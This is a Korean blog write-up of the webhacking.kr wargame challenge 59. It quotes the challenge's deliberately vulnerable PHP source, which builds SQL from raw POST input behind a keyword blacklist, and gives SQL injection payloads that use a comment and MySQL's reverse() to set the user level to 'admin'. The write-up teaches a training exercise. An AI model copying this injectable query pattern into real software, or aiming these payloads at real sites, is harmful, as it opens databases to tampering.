---
layout: post
title: ! "[Webhacking.kr] 59"
categories: [Webhacking.kr]
excerpt: " "
comments: true
share: true
tags:
  - Web-hacking
  - webhacking.kr
  - write-up
---

```php
<?

if($_POST[lid] && $_POST[lphone])
{
$q=@mysql_fetch_array(mysql_query("select id,lv from c59 where id='$_POST[lid]' and phone='$_POST[lphone]'"));

if($q[id])
{

echo("id : $q[id]<br>lv : $q[lv]<br><br>");

if($q[lv]=="admin")
{
@mysql_query("delete from c59");
@clear();
}

echo("<br><a href=index.php>back</a>");
exit();
}

}


if($_POST[id] && $_POST[phone])
{
if(strlen($_POST[phone])>=20) exit("Access Denied");
if(eregi("admin",$_POST[id])) exit("Access Denied");
if(eregi("admin|0x|#|hex|char|ascii|ord|from|select|union",$_POST[phone])) exit("Access Denied");

@mysql_query("insert into c59 values('$_POST[id]',$_POST[phone],'guest')");
}

?>
```

이 문제의 소스를 보면 lv가 admin일 때 문제가 풀리게 된다,
`insert into c59 values('$_POST[id]',$_POST[phone],'guest')`
예상되는 풀이는 insert into c59 values('~~~',~~~,'admin') 인듯하다

![](/assets/posts/webhackingkr/59_main.png)

59번은 이렇게 JOIN 과 LOGIN이 있다. 아무거나 아이디와 패스워드를 쳐서 JOIN을 한 후 로그인 하면

![](/assets/posts/webhackingkr/59_guest.png)
id는 입력한 것 그대로, lv는 guest가 뜬다.

![](/assets/posts/webhackingkr/59_lv.png)
`insert into c59 values('qqq',1,123)-- 'guest')`

이런식으로 guest부분을 주석처리 해버리면
![](/assets/posts/webhackingkr/59_lv123.png)

lv가  123으로 바뀐다.

reverse 함수는 인자로 들어온 값을 반대로 출력하는데, 이 함수를 사용해 보자
mitny    1,reverse(id))) -- 이런식으로 입력하면 lv에는 mitny를 반대로 한 값이 들어간다
![](/assets/posts/webhackingkr/59_reverse.png)

그럼 admin을 반대로 한 nimda를 id값으로 주고 reverse함수를 사용하면
![](/assets/posts/webhackingkr/59_nimda.png)

lv가 admin으로 바뀌고 문제가 풀린다

![](/assets/posts/webhackingkr/59_done.png)

